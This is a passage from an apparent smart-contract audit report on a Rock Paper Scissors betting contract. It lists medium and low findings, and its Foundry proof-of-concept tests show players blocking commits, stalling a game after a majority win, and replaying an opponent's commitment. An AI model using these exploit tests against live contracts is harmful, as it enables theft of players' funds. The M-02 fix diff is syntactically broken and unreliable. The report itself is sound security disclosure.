        bytes32 commitB = keccak256(abi.encodePacked(moveB, saltB));
        // after playerB commits the move, the revealDeadline will be set
        vm.prank(playerB);
        game.commitMove(gameId, commitB);

        // playerA reveals move
        vm.prank(playerA);
        game.revealMove(gameId, moveA, saltA);

        // playerB reveal the first turn move, the revealDeadline will not be reset
        // playerB commit the second turn move and reveal it to stop playerA from committing the second turn move
        vm.startPrank(playerB);
        game.revealMove(gameId, moveB, saltB);
        game.commitMove(gameId, commitB);
        game.revealMove(gameId, moveB, saltB);
        vm.stopPrank();

        // revert if playerA try to commit the second turn move
        vm.expectRevert("Moves already committed for this turn");
        vm.prank(playerA);
        game.commitMove(gameId, commitA);

        // warp to the end of the game
        // playerB use the timeoutReveal to win the game
        vm.warp(block.timestamp + TIMEOUT + 1);
        vm.prank(playerB);
        game.timeoutReveal(gameId);

        // console the balance of playerA and playerB
        console.log("playerA balance : ", playerA.balance);
        console.log("playerB balance : ", playerB.balance);      
    }
}
```

run the script

```bash
forge test -vvvv --mt test_RevealStopCommit
```

the result as follows

```bash
Ran 1 test for test/RockPaperScissorsTest.t.sol:RockPaperScissorsTest
[PASS] test_RevealStopCommit() (gas: 409999)
Logs:
  playerA balance :  10000000000000000000
  playerB balance :  10000000000000000000
  playerA balance :  9900000000000000000
  playerB balance :  10080000000000000000

Traces:
  [449799] RockPaperScissorsTest::test_RevealStopCommit()
    ├─ [0] console::log("playerA balance : ", 10000000000000000000 [1e19]) [staticcall]
    │   └─ ← [Stop] 
    ├─ [0] console::log("playerB balance : ", 10000000000000000000 [1e19]) [staticcall]
    │   └─ ← [Stop] 
    ├─ [0] VM::startPrank(playerA: [0x23223AC37AC99a1eC831d3B096dFE9ba061571CF])
    │   └─ ← [Return] 
    ├─ [184327] RockPaperScissors::createGameWithEth{value: 100000000000000000}(3, 600)
    │   ├─ emit GameCreated(gameId: 0, creator: playerA: [0x23223AC37AC99a1eC831d3B096dFE9ba061571CF], bet: 100000000000000000 [1e17], totalTurns: 3)
    │   └─ ← [Return] 0
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [0] VM::startPrank(playerB: [0x3d3D63BabfeD85B3e08dE2d4A6c25b0d80cf77f1])
    │   └─ ← [Return] 
    ├─ [24920] RockPaperScissors::joinGameWithEth{value: 100000000000000000}(0)
    │   ├─ emit PlayerJoined(gameId: 0, player: playerB: [0x3d3D63BabfeD85B3e08dE2d4A6c25b0d80cf77f1])
    │   └─ ← [Return] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [0] VM::prank(playerA: [0x23223AC37AC99a1eC831d3B096dFE9ba061571CF])
    │   └─ ← [Return] 
    ├─ [47753] RockPaperScissors::commitMove(0, 0x2ce9e0c6cee52fff8defaf803e3d42570ca0a102e22ce2de7049458b2e57f4bd)
    │   ├─ emit MoveCommitted(gameId: 0, player: playerA: [0x23223AC37AC99a1eC831d3B096dFE9ba061571CF], currentTurn: 1)
    │   └─ ← [Return] 
    ├─ [0] VM::prank(playerB: [0x3d3D63BabfeD85B3e08dE2d4A6c25b0d80cf77f1])
    │   └─ ← [Return] 
    ├─ [46121] RockPaperScissors::commitMove(0, 0x7b08831159711362f5a87b19b96a739a4a19fa2a9e3a7d08ef41af38654afcfc)
    │   ├─ emit MoveCommitted(gameId: 0, player: playerB: [0x3d3D63BabfeD85B3e08dE2d4A6c25b0d80cf77f1], currentTurn: 1)
    │   └─ ← [Return] 
    ├─ [0] VM::prank(playerA: [0x23223AC37AC99a1eC831d3B096dFE9ba061571CF])
    │   └─ ← [Return] 
    ├─ [4376] RockPaperScissors::revealMove(0, 1, 0xb744b7af2ebddcdb6fdac9e865330c27a0287b13a1c9d7fa8098cde1928d587c)
    │   ├─ emit MoveRevealed(gameId: 0, player: playerA: [0x23223AC37AC99a1eC831d3B096dFE9ba061571CF], move: 1, currentTurn: 1)
    │   └─ ← [Return] 
    ├─ [0] VM::startPrank(playerB: [0x3d3D63BabfeD85B3e08dE2d4A6c25b0d80cf77f1])
    │   └─ ← [Return] 
    ├─ [8045] RockPaperScissors::revealMove(0, 3, 0x164a57e3806367da85c24dac993ec49eb101618bd5fc41d7fa82eed6af9fb27c)
    │   ├─ emit MoveRevealed(gameId: 0, player: playerB: [0x3d3D63BabfeD85B3e08dE2d4A6c25b0d80cf77f1], move: 3, currentTurn: 1)
    │   ├─ emit TurnCompleted(gameId: 0, winner: playerA: [0x23223AC37AC99a1eC831d3B096dFE9ba061571CF], currentTurn: 1)
    │   └─ ← [Return] 
    ├─ [23585] RockPaperScissors::commitMove(0, 0x7b08831159711362f5a87b19b96a739a4a19fa2a9e3a7d08ef41af38654afcfc)
    │   ├─ emit MoveCommitted(gameId: 0, player: playerB: [0x3d3D63BabfeD85B3e08dE2d4A6c25b0d80cf77f1], currentTurn: 2)
    │   └─ ← [Return] 
    ├─ [4361] RockPaperScissors::revealMove(0, 3, 0x164a57e3806367da85c24dac993ec49eb101618bd5fc41d7fa82eed6af9fb27c)
    │   ├─ emit MoveRevealed(gameId: 0, player: playerB: [0x3d3D63BabfeD85B3e08dE2d4A6c25b0d80cf77f1], move: 3, currentTurn: 2)
    │   └─ ← [Return] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [0] VM::expectRevert(Moves already committed for this turn)
    │   └─ ← [Return] 
    ├─ [0] VM::prank(playerA: [0x23223AC37AC99a1eC831d3B096dFE9ba061571CF])
    │   └─ ← [Return] 
    ├─ [1203] RockPaperScissors::commitMove(0, 0x2ce9e0c6cee52fff8defaf803e3d42570ca0a102e22ce2de7049458b2e57f4bd)
    │   └─ ← [Revert] revert: Moves already committed for this turn
    ├─ [0] VM::warp(602)
    │   └─ ← [Return] 
    ├─ [0] VM::prank(playerB: [0x3d3D63BabfeD85B3e08dE2d4A6c25b0d80cf77f1])
    │   └─ ← [Return] 
    ├─ [51867] RockPaperScissors::timeoutReveal(0)
    │   ├─ emit FeeCollected(gameId: 0, feeAmount: 20000000000000000 [2e16])
    │   ├─ [0] playerB::fallback{value: 180000000000000000}()
    │   │   └─ ← [Stop] 
    │   ├─ [14461] WinningToken::mint(playerB: [0x3d3D63BabfeD85B3e08dE2d4A6c25b0d80cf77f1], 1)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: playerB: [0x3d3D63BabfeD85B3e08dE2d4A6c25b0d80cf77f1], value: 1)
    │   │   └─ ← [Return] 
    │   ├─ emit GameFinished(gameId: 0, winner: playerB: [0x3d3D63BabfeD85B3e08dE2d4A6c25b0d80cf77f1], prize: 180000000000000000 [1.8e17])
    │   └─ ← [Return] 
    ├─ [0] console::log("playerA balance : ", 9900000000000000000 [9.9e18]) [staticcall]
    │   └─ ← [Stop] 
    ├─ [0] console::log("playerB balance : ", 10080000000000000000 [1.008e19]) [staticcall]
    │   └─ ← [Stop] 
    └─ ← [Return] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.68ms (199.79µs CPU time)

Ran 1 test suite in 3.12s (1.68ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)                                                                                                               
```

## Tools Used

* Foundry

## Recommendations

To fix this vulnerability, the contract should enforce proper turn sequencing:

1. **Add State Validation**: Implement checks to ensure that a player cannot reveal their move for a turn until both players have committed their moves for that turn.


# Medium Risk Findings

## <a id='M-01'></a>M-01. Funds received thru receive() are locked🔒

_Submitted by [lucky2892000](https://profiles.cyfrin.io/u/lucky2892000), [0xshaedyw](https://profiles.cyfrin.io/u/0xshaedyw), [sharkeateateat](https://profiles.cyfrin.io/u/sharkeateateat), [xyizko](https://profiles.cyfrin.io/u/xyizko), [edoscoba](https://profiles.cyfrin.io/u/edoscoba), [zacwilliamson](https://profiles.cyfrin.io/u/zacwilliamson), [0xryker](https://profiles.cyfrin.io/u/0xryker), [0xnelli](https://profiles.cyfrin.io/u/0xnelli), [kweks](https://profiles.cyfrin.io/u/kweks), [vladich0x](https://profiles.cyfrin.io/u/vladich0x), [0xblackadam](https://profiles.cyfrin.io/u/0xblackadam), [gaurangbrdv](https://profiles.cyfrin.io/u/gaurangbrdv), [etijie](https://profiles.cyfrin.io/u/etijie), [jfornells](https://profiles.cyfrin.io/u/jfornells), [howiecht](https://profiles.cyfrin.io/u/howiecht), [vtim99077](https://profiles.cyfrin.io/u/vtim99077), [geekybot](https://profiles.cyfrin.io/u/geekybot), [dappscout](https://profiles.cyfrin.io/u/dappscout), [teoslaf](https://profiles.cyfrin.io/u/teoslaf), [arkaudits](https://profiles.cyfrin.io/u/arkaudits), [Invcbull Audit Group](https://codehawks.cyfrin.io/team/cm9v6m6w50001jr046qraih72). Selected submission by: [dappscout](https://profiles.cyfrin.io/u/dappscout)._      
            


## Summary

The Rock Paper Scissors contract includes a `receive()` function that allows it to accept ETH directly, but provides no mechanism to withdraw this ETH. This creates a permanent ETH lock situation where funds sent directly to the contract become irretrievable.

## Vulnerability Details

The contract includes a `receive()` function that accepts ETH without any restrictions:

```solidity
/**
 * @dev Fallback function to accept ETH
 */
receive() external payable {
    // Allow contract to receive ETH
}
```

However, the only ETH withdrawal mechanism in the contract is the `withdrawFees()` function, which only allows the admin to withdraw from the `accumulatedFees` variable:

```solidity
function withdrawFees(uint256 _amount) external {
    require(msg.sender == adminAddress, "Only admin can withdraw fees");

    uint256 amountToWithdraw = _amount == 0 ? accumulatedFees : _amount;
    require(amountToWithdraw <= accumulatedFees, "Insufficient fee balance");

    accumulatedFees -= amountToWithdraw;

    (bool success,) = adminAddress.call{value: amountToWithdraw}("");
    require(success, "Fee withdrawal failed");

    emit FeeWithdrawn(adminAddress, amountToWithdraw);
}
```

The problem is that ETH sent through the `receive()` function:

1. Is added to the contract's general balance
2. Is not tracked in the `accumulatedFees` variable
3. Cannot be withdrawn through the `withdrawFees()` function
4. Has no other withdrawal mechanism

## Impact

This vulnerability has medium impact because:

1. Any ETH sent directly to the contract (not through game functions) is permanently locked
2. Users or admins who accidentally send ETH to the contract address will lose those funds
3. There is no recovery mechanism for these locked funds

This issue is compounded because having a `receive()` function explicitly signals that the contract is designed to accept ETH, yet that ETH becomes trapped.

## Tools Used

Manual code review

## Recommendations

There are two possible approaches to fix this vulnerability:

**Option 1: Remove the receive function**

```solidity
// Remove this function entirely
// receive() external payable {
//     // Allow contract to receive ETH
// }
```

This prevents ETH from being sent directly to the contract, making the contract behavior clearer.

**Option 2: Add a withdrawal mechanism for all contract balance**

Either approach would prevent ETH from being permanently locked in the contract.

## <a id='M-02'></a>M-02. If a player has won the majority of turns, the losing player can prevent the winning player from receiving rewards

_Submitted by [proofofexploit](https://profiles.cyfrin.io/u/proofofexploit), [linxun](https://profiles.cyfrin.io/u/linxun), [w33ked](https://profiles.cyfrin.io/u/w33ked), [37h3rn17y2](https://profiles.cyfrin.io/u/37h3rn17y2), [anchabadze](https://profiles.cyfrin.io/u/anchabadze), [0xbyteknight](https://profiles.cyfrin.io/u/0xbyteknight), [edoscoba](https://profiles.cyfrin.io/u/edoscoba), [kweks](https://profiles.cyfrin.io/u/kweks), [azriel20005](https://profiles.cyfrin.io/u/azriel20005), [vladich0x](https://profiles.cyfrin.io/u/vladich0x), [0xblackadam](https://profiles.cyfrin.io/u/0xblackadam), [jfornells](https://profiles.cyfrin.io/u/jfornells), [favourokerri](https://profiles.cyfrin.io/u/favourokerri), [0xsaii](https://profiles.cyfrin.io/u/0xsaii), [arunrawat](https://profiles.cyfrin.io/u/arunrawat). Selected submission by: [37h3rn17y2](https://profiles.cyfrin.io/u/37h3rn17y2)._      
            


## Summary
Game does not finish even after a player has won the majority of turns. Since the opponent has essentially lost, the opponent has no incentive to continue playing. The opponent can refuse to play (commit) the remaining turns. This causes the game to be unable to reach `Finished` state, hence preventing the distribution of rewards to the winning player. In this game state, there are several resolution cases, all of which harms the winning player (detailed below) and results in the winning player not able to receive their rightful rewards, with 1 case even benefitting the losing player. This severely disrupts the fairness of the game.


## Vulnerability Details
In [`RockPaperScissors::_determineWinner#L441`](https://github.com/CodeHawks-Contests/2025-04-rock-paper-scissors/blob/25cf9f29c3accd96a532e416eee6198808ba5271/src/RockPaperScissors.sol#L441), the game is reset for the next turn if `totalTurns` is not met. Even if a player has won the majority of turns, it does not end the game but resets the game for the next turn, expecting the players to continue playing the game. 

However, the losing player has no incentive to continue playing and can refuse to play (commit) the remaining turns. Since the winning player cannot do anything for the game to reach `Finished` state before `totalTurns` has been played, the winning player will be unable to receive the rewards. This issue is applicable for both games created with token and ETH. 

[`RockPaperScissors::_determineWinner#L441`](https://github.com/CodeHawks-Contests/2025-04-rock-paper-scissors/blob/25cf9f29c3accd96a532e416eee6198808ba5271/src/RockPaperScissors.sol#L441)
```javascript
        // Reset for next turn or end game
@>      if (game.currentTurn < game.totalTurns) {
            // Reset for next turn
            game.currentTurn++;
            game.commitA = bytes32(0);
            game.commitB = bytes32(0);
            game.moveA = Move.None;
            game.moveB = Move.None;
            game.state = GameState.Committed;
        } else {
            // End game
            address winner;
            if (game.scoreA > game.scoreB) {
                winner = game.playerA;
            } else if (game.scoreB > game.scoreA) {
                winner = game.playerB;
            } else {
                // This should never happen with odd turns, but just in case
                // of timeouts or other unusual scenarios, handle as a tie
                _handleTie(_gameId);
                return;
            }

            _finishGame(_gameId, winner);
        }
```

In this game state, there are several resolution cases, neither of which benefits the winning player.

Case 1: Player A wins majority, stalemate
1. Player A (game creator) wins majority
2. Player B refuses to play (commit)
3. Player A cannot cancel game (`RockPaperScissors::cancelGame`) due to checks (`require(game.state == GameState.Created)`)
4. Both player A and player B loses out on their ETH bet

Case 2: Player B wins majority, stalemte
1. Player B wins majority
2. Player A (game creator) refuses to play (commit)
3. Player B cannot cancel game (`RockPaperScissors::cancelGame`) due to checks (`require(msg.sender == game.playerA)`)
4. Both player A and player B loses out on their ETH bet
(this is functionally similar to Case 1)

Case 3: Player wins majority, winning player use `RockPaperScissors::timeoutReveal` as escape hatch, benefitting the losing player
1. Player wins majority (at turn N)
2. Losing player refuses to play (commit) (at turn N+1)
3. Neither player can cancel game (`RockPaperScissors::cancelGame`) due to the checks (`require(game.state == GameState.Created)`) and (`require(msg.sender == game.playerA)`)
4. However, during turn N when both players have committed, [`RockPaperScissors::cancelGame#L219`](https://github.com/CodeHawks-Contests/2025-04-rock-paper-scissors/blob/25cf9f29c3accd96a532e416eee6198808ba5271/src/RockPaperScissors.sol#L219) has set a `revealDeadline` 
   ```javascript
   // If both players have committed, set the reveal deadline
        if (game.commitA != bytes32(0) && game.commitB != bytes32(0)) {
   @>       game.revealDeadline = block.timestamp + game.timeoutInterval;
        }
   ```
5. Winning player can wait for the `revealDeadline` to elapse and call `RockPaperScissors::timeoutReveal` to rescue their bet
6. This calls `RockPaperScissors::_cancelGame` which refunds the bet to both players. Winning player only receives a refund of the initial bet amount but does not get the reward they rightfully deserves and losing player does not lose the bet that they have risked (losing player gets refunded as well). This severely disrupts the fairness of the game.

## PoC

Place the following into `RockPaperScissorsTest.t.sol` and run
> forge test --mt testGameDoesNotEndAfterMajorityWins

```javascript
function testGameDoesNotEndAfterMajorityWins() public {
        uint256 _gameId;
        uint256 playerAETHBalanceBefore;
        uint256 playerAETHBalanceAfter;
        uint256 playerBETHBalanceBefore;
        uint256 playerBETHBalanceAfter;

        _gameId = createAndJoinGame();
        playerAETHBalanceBefore = playerA.balance;
        playerBETHBalanceBefore = playerB.balance;

        // Player A has already won majority of turns
        playTurn(_gameId, RockPaperScissors.Move.Rock, RockPaperScissors.Move.Scissors);
        playTurn(_gameId, RockPaperScissors.Move.Rock, RockPaperScissors.Move.Scissors);

        // Player B refuses to play (commit) the remaining turns

        // Player A has no way to cancel the game
        vm.prank(playerA);
        vm.expectRevert();
        game.cancelGame(_gameId);

        // Player A does not their receive rewards
        playerAETHBalanceAfter = playerA.balance;
        assertEq(playerAETHBalanceBefore, playerAETHBalanceAfter);
        
        // Game state is stuck in "Committed"
        (,,uint256 betAmount,,,,,,,,,,,,,RockPaperScissors.GameState state) = game.games(_gameId);
        assertEq(uint8(state), uint8(RockPaperScissors.GameState.Committed));

        // Case 3 Escape Hatch
        // Player A waits for the revealDeadline (set in 2nd turn) to elapse
        vm.warp(block.timestamp + TIMEOUT + 1);
        
        // Player A calls timeoutReveal as escape hatch to recover some funds
        vm.prank(playerA);
        game.timeoutReveal(_gameId);

        // Player A does not their receive rewards (only refunded bet)
        playerAETHBalanceAfter = playerA.balance;
        uint256 PROTOCOL_FEE_PERCENT = 10;
        uint256 playerARightfulWinnings = (betAmount * 2 * (100 - PROTOCOL_FEE_PERCENT)) / 100;
        assertLt(playerAETHBalanceAfter - playerAETHBalanceBefore, playerARightfulWinnings);
        assertEq(playerAETHBalanceAfter - playerAETHBalanceBefore, betAmount);

        // Player B got refunded their bet eventhough they lost
        playerBETHBalanceAfter = playerB.balance;
        assertEq(playerBETHBalanceAfter - playerBETHBalanceBefore, betAmount);

    }
```

## Impact
Impact: High. Game is stuck and winning player cannot receive rewards \
Likelihood: High. It is common occurrence in games to have majority wins before `totalTurns` has been played. If a player has lost before `totalTurns`, there is no incentive to continue playing. Additionally, the player can choose to use this vulnerability to exert revenge as griefing attack to prevent winning player from receiving rewards \
Severity: High

## Tools Used
Manual review

## Recommendations
End the game when a player has won a majority of turns.

```diff
function _determineWinner(uint256 _gameId) internal {
        Game storage game = games[_gameId];

        address turnWinner = address(0);

        // Rock = 1, Paper = 2, Scissors = 3
        if (game.moveA == game.moveB) {
            // Tie, no points
            turnWinner = address(0);
        } else if (
            (game.moveA == Move.Rock && game.moveB == Move.Scissors)
                || (game.moveA == Move.Paper && game.moveB == Move.Rock)
                || (game.moveA == Move.Scissors && game.moveB == Move.Paper)
        ) {
            // Player A wins
            game.scoreA++;
            turnWinner = game.playerA;
        } else {
            // Player B wins
            game.scoreB++;
            turnWinner = game.playerB;
        }

        emit TurnCompleted(_gameId, turnWinner, game.currentTurn);

        // Reset for next turn or end game
        if (game.currentTurn < game.totalTurns) {
+           // Check if a player has won majority of the turns
+           uint256 public constant PRECISION = 100; 
+           uint256 public constant MAJORITY = 50; // 50%
+           bool playerAalreadyWonMajority = game.scoreA * PRECISION / game.totalTurns > MAJORITY
+           bool playerBalreadyWonMajority = game.scoreB * PRECISION / game.totalTurns > MAJORITY
+
+           // If playerA has already won the majority of turns, finish the game with player A as the winner
+           // If playerB has already won the majority of turns, finish the game with player B as the winner
+           // If neither player has won majority, reset for next turn
+           if (playerAalreadyWonMajority) { 
+               _finishGame(_gameId, game.playerA)
+           } else if (playerBalreadyWonMajority) { 
+               _finishGame(_gameId, game.playerB) 
+           } else {
                // Reset for next turn
                game.currentTurn++;
                game.commitA = bytes32(0);
                game.commitB = bytes32(0);
                game.moveA = Move.None;
                game.moveB = Move.None;
                game.state = GameState.Committed;
+           }
        } else {
            // End game
            address winner;
            if (game.scoreA > game.scoreB) {
                winner = game.playerA;
            } else if (game.scoreB > game.scoreA) {
                winner = game.playerB;
            } else {
                _handleTie(_gameId);
                return;
            }

            _finishGame(_gameId, winner);
        }
    }
```
## <a id='M-03'></a>M-03. Lack of Player Address Binding in Move Commitments Allows Replay and Cheating in RockPaperScissors Contract

_Submitted by [proofofexploit](https://profiles.cyfrin.io/u/proofofexploit), [hosam](https://profiles.cyfrin.io/u/hosam), [damokles062](https://profiles.cyfrin.io/u/damokles062), [bukhara2002](https://profiles.cyfrin.io/u/bukhara2002), [sauron22](https://profiles.cyfrin.io/u/sauron22), [37h3rn17y2](https://profiles.cyfrin.io/u/37h3rn17y2), [thecarrot](https://profiles.cyfrin.io/u/thecarrot), [yoitsuro](https://profiles.cyfrin.io/u/yoitsuro), [0xdef4](https://profiles.cyfrin.io/u/0xdef4), [vito](https://profiles.cyfrin.io/u/vito), [xyizko](https://profiles.cyfrin.io/u/xyizko), [nomadic_bear](https://profiles.cyfrin.io/u/nomadic_bear), [gkarumbi](https://profiles.cyfrin.io/u/gkarumbi), [mustaphaabdulaziz00](https://profiles.cyfrin.io/u/mustaphaabdulaziz00), [vincent71399](https://profiles.cyfrin.io/u/vincent71399), [0xbyteknight](https://profiles.cyfrin.io/u/0xbyteknight), [0xsaii](https://profiles.cyfrin.io/u/0xsaii), [narendravarma070](https://profiles.cyfrin.io/u/narendravarma070), [epintos](https://profiles.cyfrin.io/u/epintos), [teheelaa](https://profiles.cyfrin.io/u/teheelaa), [turiz](https://profiles.cyfrin.io/u/turiz), [staykovd](https://profiles.cyfrin.io/u/staykovd), [0xshield](https://profiles.cyfrin.io/u/0xshield). Selected submission by: [bukhara2002](https://profiles.cyfrin.io/u/bukhara2002)._      
            


## Summary

The `RockPaperScissors` smart contract fails to bind player addresses to their committed moves, allowing malicious actors to reuse or intercept another player's commitment. This vulnerability undermines the fairness of the game and opens the door for replay attacks or unauthorized move revelations.

## Vulnerability Details

The commit-reveal mechanism implemented in the RockPaperScissors contract allows players to commit to their moves by hashing the move and a secret. However, the contract does **not include the player's address** in the commitment hash, which leads to the following issues:

&#x20;

1. **Replay Attack:**\
   A malicious player (e.g., Player B) can copy a previously observed commitment from the other player (Player A) and use it as their own, effectively mirroring moves without knowing the secret.
2. **Reveal Phase Exploitation:** If Player A later reveals their move and secret, Player B can use the same values to reveal too, and pass the hash check. Since there’s no per-player validation of who originally committed the move, B’s reveal will be accepted.
3. **Game Integrity Compromise:**\
   This allows Player B to always mirror Player A’s commitment, guaranteeing at least a draw or even a win if they selectively reveal. It also opens the door to front-running, collusion, or scripted manipulation in a competitive setting.

***

## Impact

The vulnerability allows a **malicious player to replicate a legitimate player's commitment and reveal actions**, because the contract does not bind moves to player addresses. This breaks the **integrity and fairness** of the game, enabling:

&#x20;

* **Commitment spoofing** (e.g., B copies A's move).
* **Forced draws or avoided losses** through selective reveals.
* **Unfair wins**, leading to **loss of rewards or funds**.

## Tools Used

* Manual Code Review

- Foundry (Test framework)
- Custom test cases simulating malicious reveal and replay scenarios

```Solidity
    function testGameFairNess() public {
        gameId = createAndJoinGame();
        // Player A commits
        uint8 moveA = 1; // Rock
        bytes32 saltA = keccak256(abi.encodePacked("salt for player A"));
        bytes32 commitA = keccak256(abi.encodePacked(moveA, saltA));
        vm.prank(playerA);
        game.commitMove(gameId, commitA);
        // Player B can wait Player A to commit and commit the same 
        // hash 
        bytes32 commitB = commitA ;
        vm.prank(playerB);
        game.commitMove(gameId, commitB);
        // A reveals first
        vm.prank(playerA);
        game.revealMove(gameId, moveA, saltA);
        // B now copies move/salt of player A and reveals
        vm.prank(playerB);
        game.revealMove(gameId, moveA, saltA);
        // we will have a tie and no one will win 
    }
```

## Recommendations

1. **Bind Commitments to Player Address:**

   Change the commitment scheme to include the player’s address when generating the hash, e.g.:

&#x20;

```Solidity
bytes32 commitment = keccak256(abi.encodePacked(move, secret, msg.sender);
```

1. **Update Reveal Logic Accordingly:**
   Ensure that during the reveal phase, the hash is recomputed using msg.sender, the revealed move, and the secret, and that it matches the stored commitment.

2. **Test for Malicious Behavior:**
   Add unit tests to ensure that a player cannot reuse another’s commitment or spoof reveals.


# Low Risk Findings

## <a id='L-01'></a>L-01. WinningToken Accumulation in the RockPaperScissors Due to Incorrect transferFrom Usage

_Submitted by [0xluckyluke](https://profiles.cyfrin.io/u/0xluckyluke), [ciphermalware](https://profiles.cyfrin.io/u/ciphermalware), [sa1ntrobi](https://profiles.cyfrin.io/u/sa1ntrobi), [sauron22](https://profiles.cyfrin.io/u/sauron22), [37h3rn17y2](https://profiles.cyfrin.io/u/37h3rn17y2), [a39955720](https://profiles.cyfrin.io/u/a39955720), [vito](https://profiles.cyfrin.io/u/vito), [phylax](https://profiles.cyfrin.io/u/phylax), [blackgrease](https://profiles.cyfrin.io/u/blackgrease), [0xdonchev](https://profiles.cyfrin.io/u/0xdonchev), [hosam](https://profiles.cyfrin.io/u/hosam), [gaurangbrdv](https://profiles.cyfrin.io/u/gaurangbrdv), [0xdegn](https://profiles.cyfrin.io/u/0xdegn), [edoscoba](https://profiles.cyfrin.io/u/edoscoba), [swarecito](https://profiles.cyfrin.io/u/swarecito), [0x_martonyx](https://profiles.cyfrin.io/u/0x_martonyx), [0xbyteknight](https://profiles.cyfrin.io/u/0xbyteknight), [feranmiola](https://profiles.cyfrin.io/u/feranmiola), [0xryker](https://profiles.cyfrin.io/u/0xryker), [zacwilliamson](https://profiles.cyfrin.io/u/zacwilliamson), [bigchapo21](https://profiles.cyfrin.io/u/bigchapo21), [narendravarma070](https://profiles.cyfrin.io/u/narendravarma070), [kweks](https://profiles.cyfrin.io/u/kweks), [0xblackadam](https://profiles.cyfrin.io/u/0xblackadam), [epintos](https://profiles.cyfrin.io/u/epintos), [aliyugombe](https://profiles.cyfrin.io/u/aliyugombe), [albert](https://profiles.cyfrin.io/u/albert), [freesultan](https://profiles.cyfrin.io/u/freesultan), [eagerpanda582](https://profiles.cyfrin.io/u/eagerpanda582), [nhippolyt](https://profiles.cyfrin.io/u/nhippolyt), [staykovd](https://profiles.cyfrin.io/u/staykovd), [cyfe45](https://profiles.cyfrin.io/u/cyfe45), [jfornells](https://profiles.cyfrin.io/u/jfornells), [jufka](https://profiles.cyfrin.io/u/jufka), [roccomania](https://profiles.cyfrin.io/u/roccomania), [foxx254](https://profiles.cyfrin.io/u/foxx254), [accessdenied](https://profiles.cyfrin.io/u/accessdenied), [vtim99077](https://profiles.cyfrin.io/u/vtim99077), [codeaudit0x1](https://profiles.cyfrin.io/u/codeaudit0x1), [arunrawat](https://profiles.cyfrin.io/u/arunrawat), [howiecht](https://profiles.cyfrin.io/u/howiecht), [teoslaf](https://profiles.cyfrin.io/u/teoslaf), [arkaudits](https://profiles.cyfrin.io/u/arkaudits), [dexcripter](https://profiles.cyfrin.io/u/dexcripter), [mishoko](https://profiles.cyfrin.io/u/mishoko). Selected submission by: [0x_martonyx](https://profiles.cyfrin.io/u/0x_martonyx)._      
            


## Summary 

The `WinningToken` contract inherits the `ERC20Burnable` contract from `Openzeppelin` contracts but it never implemented it. And according to the structure of the game contract, it `mints` new tokens to winners at the end of every Game and then the previous tokens (sent by users) are left in the contract, never burned, refunded, nor reused.

## Vulnerability Details

The `createGameWithToken` and the `joinGameWithToken` functions of the `RockPaperScissors` contract **transfers** (instead of **burning**) the required `winningToken` from players to the game contract.  This leads to:

* **Accumulation of tokens** in the contract with no recovery mechanism.

here's the bug

```Solidity
    function createGameWithToken(uint256 _totalTurns, uint256 _timeoutInterval) external returns (uint256) {
        require(winningToken.balanceOf(msg.sender) >= 1, "Must have winning token");
        require(_totalTurns > 0, "Must have at least one turn");
        require(_totalTurns % 2 == 1, "Total turns must be odd");
        require(_timeoutInterval >= 5 minutes, "Timeout must be at least 5 minutes");

        // Transfer token to contract
   @>   winningToken.transferFrom(msg.sender, address(this), 1);

        uint256 gameId = gameCounter++;

        Game storage game = games[gameId];
        game.playerA = msg.sender;
        game.bet = 0; // Zero ether bet because using token
        game.timeoutInterval = _timeoutInterval;
        game.creationTime = block.timestamp;
        game.joinDeadline = block.timestamp + joinTimeout;
        game.totalTurns = _totalTurns;
        game.currentTurn = 1;
        game.state = GameState.Created;

        emit GameCreated(gameId, msg.sender, 0, _totalTurns);

        return gameId;
    }
```

## **Proof of Concept**

1. Alice creates game (transfers 1 token to contract)
2. Bob joins game (transfers 1 token to contract)
3. Game concludes (mints 2 new tokens to winner)
4. **Result**:

   * Net supply change: +2 tokens
   * Contract balance grows indefinitely

## Impact

Tokens are permanently locked in the contract, reducing access to token supply and potentially disrupting game economics.

## Tools Used

Manual Review

## Recommendations

Change the transferFrom command to burnFrom in both the createGameWithToken and the joinGameWithToken functions of the `RockPaperScissors`contract

```Solidity
    function createGameWithToken(uint256 _totalTurns, uint256 _timeoutInterval) external returns (uint256) {
        require(winningToken.balanceOf(msg.sender) >= 1, "Must have winning token");
        require(_totalTurns > 0, "Must have at least one turn");
        require(_totalTurns % 2 == 1, "Total turns must be odd");
        require(_timeoutInterval >= 5 minutes, "Timeout must be at least 5 minutes");

 +      // Burn tokens from the sender
 +      winningToken.burnFrom(msg.sender, 1);
 -      winningToken.transferFrom(msg.sender, address(this), 1);

        uint256 gameId = gameCounter++;

        Game storage game = games[gameId];
        game.playerA = msg.sender;
        game.bet = 0; // Zero ether bet because using token
        game.timeoutInterval = _timeoutInterval;
        game.creationTime = block.timestamp;
        game.joinDeadline = block.timestamp + joinTimeout;
        game.totalTurns = _totalTurns;
        game.currentTurn = 1;
        game.state = GameState.Created;

        emit GameCreated(gameId, msg.sender, 0, _totalTurns);

        return gameId;
    }
```

then remove this line from the test file

```Solidity
    function testCreateGameWithToken() public {
        vm.startPrank(playerA);

        // Approve token transfer
        token.approve(address(game), 1);

        // Create a game with token
        vm.expectEmit(true, true, false, true);
        emit GameCreated(0, playerA, 0, TOTAL_TURNS);

        gameId = game.createGameWithToken(TOTAL_TURNS, TIMEOUT);
        vm.stopPrank();

        // Verify token transfer
        assertEq(token.balanceOf(playerA), 9);
@>      // assertEq(token.balanceOf(address(game)), 1);

        // Verify game details
        (address storedPlayerA,,,,,,,,,,,,,,, RockPaperScissors.GameState state) = game.games(gameId);

        assertEq(storedPlayerA, playerA);
        assertEq(uint256(state), uint256(RockPaperScissors.GameState.Created));
    }
```

## <a id='L-02'></a>L-02. [H-01] ETH Rounding Error in RockPaperScissors::_handleTie()

